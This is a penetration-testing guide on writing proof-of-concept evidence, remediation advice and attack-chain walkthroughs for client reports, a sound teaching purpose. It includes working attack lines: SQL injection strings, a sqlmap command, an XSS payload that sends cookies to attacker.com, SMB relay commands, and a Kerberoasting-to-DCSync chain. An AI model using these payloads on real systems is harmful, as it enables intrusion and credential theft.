## Proof-of-Concept (PoC)

A PoC in penetration testing is the bridge between discovering a vulnerability and proving it has real, demonstrable impact. It transforms a theoretical finding into something a developer, administrator, or executive can see, reproduce, and act on.

***

## What a PoC Actually Is

A PoC is not just a script. It is any form of evidence that unambiguously proves a security problem exists and is exploitable.

```
PoC representations, from weakest to strongest:

1. Documentation only:
   - Screenshot of sensitive file being read
   - Screenshot of /etc/passwd or C:\Windows\System32\config\SAM
   - Network capture showing cleartext credentials
   - Weakest form, but sometimes appropriate for low-risk findings

2. Step-by-step reproduction guide:
   - Exact commands used, in order
   - Expected output at each step
   - Allows the admin to reproduce manually
   - No automation, but fully verifiable

3. Annotated script or code:
   - Automated exploitation with clear comments explaining each step
   - Developer can read the code and understand the vulnerability mechanism
   - Strongest technical form - leaves no ambiguity

4. Attack chain walkthrough (most valuable for domain compromise):
   - Documents the full path from initial access to domain admin
   - Shows which vulnerabilities were chained
   - Demonstrates cumulative impact of multiple individual weaknesses
   - Includes evidence at each step: screenshots, command output, hashes captured

Classic PoC benchmark for OS-level RCE:
   calc.exe execution on Windows target
   This proves code execution without causing damage
   It is universally understood as unambiguous proof of RCE
   Can be replaced with:
     - hostname or whoami output
     - Writing a file to a protected directory
     - Making an outbound connection to a controlled server
```

***

## The Critical Limitation of Script-Based PoCs

This is the most important concept in this entire section and the one most often misunderstood by clients.

```
The danger:

You provide a working exploit script.
The admin patches specifically against your script.
The script no longer works.
The admin marks the vulnerability as "fixed."

Why this is wrong:
  - The script was one path to exploit one vulnerability
  - Patching to stop your specific script does not close the underlying weakness
  - A different tool, technique, or encoding will exploit the same flaw

Real-world example:
  Finding: SQLi via username field
  PoC script: uses ' OR 1=1-- to dump the users table

  Wrong remediation: blacklist the string "OR 1=1"
  Correct remediation: parameterised queries / prepared statements

  After wrong remediation:
  - Your script fails
  - admin@company.com marks it resolved
  - The injection point still exists
  - New payload: ' UNION SELECT null,username,password FROM users--
  - Fully exploitable, just different syntax

What to do about it:
  - Explicitly state in your report that the script is one of many possible vectors
  - State that remediation must address the root cause, not the specific payload
  - Include this caveat in the verbal report review meeting
  - Provide the underlying CVE or CWE reference so remediation targets the class
    of vulnerability, not the instance
```

***

## The Root Cause Principle

Every finding in your report should identify the root cause, not just the symptom. The PoC proves the symptom. The remediation must address the root cause.

```
Symptom vs Root Cause examples:

Finding: Domain Admin using Password123
  Symptom:    One account has a weak password
  Root cause: Password policy does not enforce complexity/length minimums
  Wrong fix:  Change that admin's password
  Right fix:  Enforce Group Policy password requirements domain-wide
              + audit all privileged accounts
              + implement MFA for all admin accounts

Finding: Apache 2.4.49 vulnerable to CVE-2021-41773 (path traversal/RCE)
  Symptom:    One server is running a vulnerable version
  Root cause: No patch management process for public-facing infrastructure
  Wrong fix:  Update that one server
  Right fix:  Implement asset inventory + automated patch management
              + vulnerability scanning cadence

Finding: Anonymous FTP access exposing internal documents
  Symptom:    One FTP server allows unauthenticated access
  Root cause: No baseline security configuration standard for servers
  Wrong fix:  Disable anonymous on that FTP server
  Right fix:  Implement CIS Benchmarks or equivalent hardening standard
              across all servers + periodic configuration auditing

Finding: SMB signing disabled across internal network
  Symptom:    NTLM relay attacks are possible against 47 hosts
  Root cause: Default Windows configuration accepted without hardening
  Wrong fix:  Enable signing on the specific hosts you targeted in the test
  Right fix:  GPO enforcing SMB signing required on all domain hosts
```

***

## Attack Chain Documentation

For internal assessments that result in domain compromise, an attack chain walkthrough is the most impactful PoC format. It shows the cumulative effect of multiple weaknesses that individually might be rated medium but together are catastrophic.

```
Attack chain structure in a report:

Step 1 -> Initial Access
  Method:   SQL injection on external web application (CVE reference)
  Evidence: Screenshot of /etc/passwd content returned in response
  Impact:   Code execution as www-data on WEB01

Step 2 -> Local Privilege Escalation
  Method:   Sudo misconfiguration allowing www-data to run vim as root
  Evidence: Screenshot of whoami output showing root after sudo vim exploit
  Impact:   Root access on WEB01

Step 3 -> Credential Discovery
  Method:   Found MySQL credentials in /var/www/html/config.php
  Evidence: File contents showing plaintext DB password
  Credentials obtained: dbadmin : S3cur3P@ssw0rd!

Step 4 -> Lateral Movement
  Method:   Credential reuse - dbadmin account exists on DBSRV01 and FILESRV01
  Evidence: Screenshots of successful login to both systems
  Impact:   Access to database server and internal file server

Step 5 -> Domain Privilege Escalation
  Method:   Kerberoasting - dbadmin is a service account with SPN set
            Hash cracked offline in 4 minutes with rockyou.txt
  Evidence: Hash + cracked password + BloodHound path showing DA membership
  Impact:   Domain Admin credentials obtained

Step 6 -> Domain Compromise
  Method:   DCSync using Domain Admin credentials
  Evidence: Redacted output of secretsdump showing all domain hashes extracted
  Impact:   All domain credentials compromised. Full network access achieved.

Break-the-chain analysis (what to put in remediation section):
  Fixing Step 1 alone (SQLi): breaks chain at the start
  Fixing Step 2 alone (sudo): attacker stays as www-data, cannot escalate
  Fixing Step 3 alone (exposed config): no credentials discovered, chain stalls
  Fixing Step 4 alone (credential reuse): no lateral movement possible
  Fixing Step 5 alone (Kerberoasting): service account hash not crackable
  Fixing Step 6 alone (DCSync): does not prevent earlier compromise

The point: all six weaknesses still exist until all six are remediated.
Fixing any single link is valuable, but the other links must also be addressed.
```

***

## PoC Format Per Finding Type

```
Web application findings:

SQL Injection:
  Request:
    POST /login HTTP/1.1
    Host: target.com
    Content-Type: application/x-www-form-urlencoded

    username=admin'--&password=anything

  Response (PoC): 200 OK, logged in as admin without correct password
  Evidence: Screenshot of authenticated session + Burp Suite request/response

  Automated PoC:
    sqlmap -u "http://target.com/login" --data "username=*&password=test" --dbs

XSS:
  Payload: <script>document.location='http://attacker.com/cookie?c='+document.cookie</script>
  PoC: Screenshot showing cookie received on attacker server
  Impact: Session hijacking possible for any user who views the injected content

Network findings:

SMB Relay PoC:
  1. Run: crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
  2. Run: ntlmrelayx.py -tf targets.txt -smb2support
  3. Run: responder -I eth0
  4. Wait for authentication event
  Evidence: Screenshot of ntlmrelayx output showing successful relay and shell

Default credentials PoC:
  Simply: curl -u admin:admin http://target.com/admin/ -v
  Screenshot: authenticated response showing admin panel
  This is often the most impactful and embarrassing finding in a report

Infrastructure findings:

Unpatched CVE PoC:
  Document: Nmap version scan output confirming exact vulnerable version
  Provide: CVE reference, CVSS score, public PoC reference
  Execute: Run PoC and screenshot successful exploitation
  Evidence: calc.exe popup / whoami output / file write confirmation
```

***

## PoC Evidence Standards

```
Every PoC in your report must include:

Minimum required evidence per finding:
  - Date and timestamp of exploitation
  - Hostname and IP address of target system
  - Username context at time of exploitation
  - Command(s) or request(s) used
  - Output or response proving success
  - Screenshot or terminal recording

Screen recording recommendation:
  For critical findings (RCE, domain compromise, data exfiltration):
  Run a screen recorder throughout the exploitation
  Terminal recording:
    script -a /path/to/pentest_log.txt   # logs all terminal output
    asciinema rec exploitation.cast      # creates shareable terminal recording

Screenshot best practice:
  Always include in the same screenshot:
    hostname / whoami / ip a or ipconfig
  This proves:
    - Which system you were on
    - What user context you had
    - At what network location
  Without this, a sceptical developer can question the validity of the finding

Activity log extract format:
  Timestamp  | System        | Action                    | Result
  -----------+---------------+---------------------------+----------------------
  14:32:11   | WEB01         | Tested SQLi on /login     | Auth bypass confirmed
  14:38:44   | WEB01         | Sudo -l enumeration       | vim allowed as root
  14:41:02   | WEB01         | sudo vim RCE              | Shell as root
  14:45:18   | WEB01 -> DB01 | Credential reuse test     | Login successful
  15:02:33   | DC01          | Kerberoast dbadmin        | Hash obtained
  15:06:47   | Attacker box  | Hashcat crack             | Password recovered
  15:09:11   | DC01          | DCSync as dbadmin         | All hashes dumped
```

***

## PoC Report Review Meeting

The written report alone is rarely enough. The review meeting is where you make sure the root cause message lands correctly.

```
Key points to drive home in the review meeting:

1. The script/PoC we provided is not the threat.
   The vulnerability it demonstrates is the threat.
   Other tools, attackers, and techniques will produce the same result.

2. Remediation must target the vulnerability class, not the specific payload.
   "Your SQLi is not fixed because you blocked our specific string.
    It is fixed when your queries use parameterised statements."

3. An attack chain shows that individual medium findings become critical together.
   "Any one of these six issues, fixed in isolation, is still progress.
    But until all six are addressed, the domain remains compromisable."

4. Any unaddressed finding is a remaining attack path.
   "We found 14 issues. You have fixed 10. The remaining 4 each represent
    a path an attacker could still take today."

5. Retest value.
   "After remediation, we recommend a targeted retest of each finding.
    This confirms the fix is effective, not just cosmetic."
```
